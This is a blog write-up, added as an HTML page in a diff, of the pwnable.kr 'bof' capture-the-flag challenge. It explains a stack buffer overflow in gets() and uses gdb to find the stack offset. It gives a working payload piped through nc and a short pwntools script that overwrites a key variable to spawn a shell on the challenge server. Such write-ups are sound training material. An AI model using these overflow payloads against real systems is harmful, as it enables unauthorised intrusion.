@@ -1,0 +1,585 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>pwnable.kr - bof - 0xRick’s Blog</title>
+<meta name="description" content="My write-up for bof from pwnable.kr.">
+
+
+  <meta name="author" content="0xRick">
+  
+  <meta property="article:author" content="0xRick">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en">
+<meta property="og:site_name" content="0xRick's Blog">
+<meta property="og:title" content="pwnable.kr - bof">
+<meta property="og:url" content="https://0xrick.github.io/pwn/bof">
+
+
+  <meta property="og:description" content="My write-up for bof from pwnable.kr.">
+
+
+
+
+
+  <meta name="twitter:site" content="@ahm3d_h3sham">
+  <meta name="twitter:title" content="pwnable.kr - bof">
+  <meta name="twitter:description" content="My write-up for bof from pwnable.kr.">
+  <meta name="twitter:url" content="https://0xrick.github.io/pwn/bof">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2019-06-10T07:00:00+02:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://0xrick.github.io/pwn/bof">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "0xRick",
+      "url": "https://0xrick.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          0xRick's Blog
+          
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags">Tags</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0xRick</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+ 
+  
+  </div>
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="pwnable.kr - bof">
+    <meta itemprop="description" content="pwnable.kr - bof">
+    <meta itemprop="datePublished" content="2019-06-10T07:00:00+02:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://0xrick.github.io/pwn/bof" class="u-url" itemprop="url">pwnable.kr - bof
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2019-06-10T07:00:00+02:00">June 10, 2019</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        <div>
+          <style>
+              #carbonads {
+                border: 1px solid black;
+                border-radius: 7px;
+                border-spacing: 7px;
+                display: block;
+                overflow: hidden;
+                padding: 1em;
+                line-height: 1.5;
+              }
+              #carbonads span {
+                position: relative;
+                display: block;
+                overflow: hidden;
+              }
+              .carbon-img img {
+                display: block;
+                float: left;
+              }
+              .carbon-text {
+                display: block;
+                font-size: .9em;
+                text-align: end;
+              }
+              .carbon-poweredby {
+                display: block;
+                font-size: .8em;
+                float: right;
+                line-height: 1;
+                letter-spacing: 1px;
+                }
+                </style>
+                <br>   
+          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
+                <br>
+        </div>
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title">
+<i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li>
+<a href="#pwnablekr---bof">pwnable.kr - bof</a><ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#challenge-description">Challenge Description</a></li>
+<li><a href="#code-analysis">Code Analysis</a></li>
+<li><a href="#examining-the-binary-exploitation">Examining the Binary, Exploitation</a></li>
+<li><a href="#writing-an-exploit-with-pwntools">Writing an Exploit with pwntools</a></li>
+</ul>
+</li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="pwnablekr---bof">pwnable.kr - bof</h1>
+
+<h2 id="introduction">Introduction</h2>
+<p>Hey guys it’s been a long time since my <a href="https://0xrick.github.io/pwn/fd/">first pwn write-up</a>,  today I’ll write about another challenge from <a href="https://pwnable.kr" target="_blank" rel="noopener noreferrer">pwnable.kr</a> called bof. It was a simple easy buffer overflow challenge (You can also check <a href="/categories/#binary-exploitation">these</a>), by overwriting a variable we can get a shell. I’ll also write a small exploit with <code class="language-plaintext highlighter-rouge">pwntools</code> that spawns a shell automatically.<br>
+<br><img src="/images/pwn/bof/0.png" alt="" class="align-center"><br><br></p>
+
+<h2 id="challenge-description">Challenge Description</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nana told me that buffer overflow is one of the most common software vulnerability.
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+</code></pre></div></div>
+<p>Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running.<br>
+<br><img src="/images/pwn/bof/1.png" alt="" class="align-center"><br><br></p>
+
+<h2 id="code-analysis">Code Analysis</h2>
+<p>Let’s take a look at the code :</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+</span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>There are two functions, the main function and another function called <code class="language-plaintext highlighter-rouge">func()</code>
+<code class="language-plaintext highlighter-rouge">func()</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Breakdown :
+<br>The function takes a variable called <code class="language-plaintext highlighter-rouge">key</code>, it starts by creating a variable called <code class="language-plaintext highlighter-rouge">overflowme</code> and sets a buffer of 32 chars for it : <code class="language-plaintext highlighter-rouge">char overflowme[32];</code>
+<br>Then it prints <code class="language-plaintext highlighter-rouge">overflow me :</code> (<code class="language-plaintext highlighter-rouge">printf("overflow me : ");</code>)  and waits for our input which will be saved in the variable <code class="language-plaintext highlighter-rouge">overflowme</code> (<code class="language-plaintext highlighter-rouge">gets(overflowme);</code>)
+<br>After that there’s an if statement that checks if the variable <code class="language-plaintext highlighter-rouge">key</code> is equal to <code class="language-plaintext highlighter-rouge">0xcafebabe</code> (<code class="language-plaintext highlighter-rouge">if(key == 0xcafebabe){</code>). If that’s true it will spawn a shell (<code class="language-plaintext highlighter-rouge">system("/bin/sh");</code>), if <code class="language-plaintext highlighter-rouge">key</code> is equal to anything else it will print <code class="language-plaintext highlighter-rouge">Nah..</code> (<code class="language-plaintext highlighter-rouge">printf("Nah..\n");</code>)</p>
+
+<p><code class="language-plaintext highlighter-rouge">main()</code> :</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Basically what the main function is doing is just calling the function <code class="language-plaintext highlighter-rouge">func()</code> giving <code class="language-plaintext highlighter-rouge">key</code> the value of <code class="language-plaintext highlighter-rouge">0xdeadbeef</code></p>
+
+<p>So we need to make <code class="language-plaintext highlighter-rouge">key</code> equal to <code class="language-plaintext highlighter-rouge">0xcafebabe</code> instead of <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> to make it spawn a shell. We control <code class="language-plaintext highlighter-rouge">overflowme</code> but we don’t control <code class="language-plaintext highlighter-rouge">key</code>. If we can cause a buffer overflow we will be able to overwrite <code class="language-plaintext highlighter-rouge">key</code>, and obviously <code class="language-plaintext highlighter-rouge">overflowme</code> is vulnerable.<br></p>
+
+<h2 id="examining-the-binary-exploitation">Examining the Binary, Exploitation</h2>
+<p>I ran the program and tested it a couple of times. First one with a short input :
+<br><img src="/images/pwn/bof/3.png" alt="" class="align-center"><br><br>
+Second one with a longer input and it crashed:
+<br><img src="/images/pwn/bof/4.png" alt="" class="align-center"><br><br>
+Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite <code class="language-plaintext highlighter-rouge">EIP</code>, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> is located on the stack.<br>
+It’s time for <code class="language-plaintext highlighter-rouge">gdb</code>. I started <code class="language-plaintext highlighter-rouge">gdb</code> and created a break point at <code class="language-plaintext highlighter-rouge">main</code> (<code class="language-plaintext highlighter-rouge">break main</code>) then I started the program (<code class="language-plaintext highlighter-rouge">r</code>) : 
+<br><img src="/images/pwn/bof/5.png" alt="" class="align-center"><br><br>
+It stopped at the break point. We need to disassemble the function <code class="language-plaintext highlighter-rouge">func()</code> to get the address of the compare instruction that compares between the value of <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">0xcafebabe</code> to set another break point there and look at the stack.<br>
+<code class="language-plaintext highlighter-rouge">disas func</code>
+<br><img src="/images/pwn/bof/6.png" alt="" class="align-center"><br><br>
+We can see the <a href="https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">cmpl</code> (Compare Logical)</a> instruction at <code class="language-plaintext highlighter-rouge">0x0000654</code>, Lets set a break point exactly before it :
+<code class="language-plaintext highlighter-rouge">break *0x80000654</code>
+<br><img src="/images/pwn/bof/7.png" alt="" class="align-center"><br><br>
+Now let’s continue the execution (<code class="language-plaintext highlighter-rouge">c</code>) and wait for our break point.<br>
+<br><img src="/images/pwn/bof/8.png" alt="" class="align-center"><br><br>
+I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>.<br>
+After hitting the second break point let’s look at the stack :
+<code class="language-plaintext highlighter-rouge">x/50wx $esp</code>
+<br><img src="/images/pwn/bof/9.png" alt="" class="align-center"><br><br>
+<code class="language-plaintext highlighter-rouge">0xdeadbeef</code> appears at the first row in front of <code class="language-plaintext highlighter-rouge">0xbffff2e0</code> and our input starts to appear at the last row in front of <code class="language-plaintext highlighter-rouge">0xbffff2a0</code>. We can locate the distance between our input and <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> easily, each hex value represents 4 chars (<code class="language-plaintext highlighter-rouge">0x41414141 == AAAA</code>) and we have exactly 13 of them before <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> (<code class="language-plaintext highlighter-rouge">1 + 4 + 4 + 4</code>).<br>
+<br><img src="/images/pwn/bof/10.png" alt="" class="align-center"><br><br>
+We need to give the program exactly 52 chars then <code class="language-plaintext highlighter-rouge">0xcafebabe</code> and eventually <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> will be overwritten.<br>
+Let’s try it, I used python to print the payload in a file then I piped that file to the <code class="language-plaintext highlighter-rouge">nc</code> connection :
+<br><code class="language-plaintext highlighter-rouge">python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" &gt; ./payload</code>
+<br><code class="language-plaintext highlighter-rouge">(cat payload &amp;&amp; cat) | nc pwnable.kr 9000</code>
+<br><img src="/images/pwn/bof/11.png" alt="" class="align-center"><br><br>
+Pwned !</p>
+
+<h2 id="writing-an-exploit-with-pwntools">Writing an Exploit with pwntools</h2>
+<p>One of the cool things about <code class="language-plaintext highlighter-rouge">pwntools</code> is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code.<br>
+First thing we need to do is to import <code class="language-plaintext highlighter-rouge">pwntools</code> :
+<br><code class="language-plaintext highlighter-rouge">from pwn import *</code>
+<br>We need to store our payload in a variable :
+<br><code class="language-plaintext highlighter-rouge">payload = 'A' * 52 + '\xbe\xba\xfe\xca'</code>
+<br>Then we need to initiate the connection and assign a variable for it : 
+<br><code class="language-plaintext highlighter-rouge">shell = remote('pwnable.kr' ,9000)</code>
+<br>After that we will send the payload :
+<br><code class="language-plaintext highlighter-rouge">shell.send(payload)</code>
+<br>And finally we can interact with our shell :
+<br><code class="language-plaintext highlighter-rouge">shell.interactive()</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">52</span> <span class="o">+</span> <span class="s">'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">'</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span><span class="mi">9000</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><br><img src="/images/pwn/bof/13.png" alt="" class="align-center"><br><br>
+Pwned again !</p>
+
+<p><br>That’s it , Feedback is appreciated !
+<br>Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
+<br>Thanks for reading.<br>
+Previous pwn write-up : <a href="/pwn/fd/">pwnable.kr - fd</a>
+<br>Next pwn write-up : <a href="/pwn/collision/">pwnable.kr - collision</a></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-10T07:00:00+02:00">June 10, 2019</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/hack-the-box/help" class="pagination--pager" title="Hack The Box - Help
+">Previous</a>
+    
+    
+      <a href="/hack-the-box/flujab" class="pagination--pager" title="Hack The Box - FluJab
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+    <ul class="social-icons">
+      
+  
+      
+  
+      
+    </ul>
+  </div>
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
+</script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
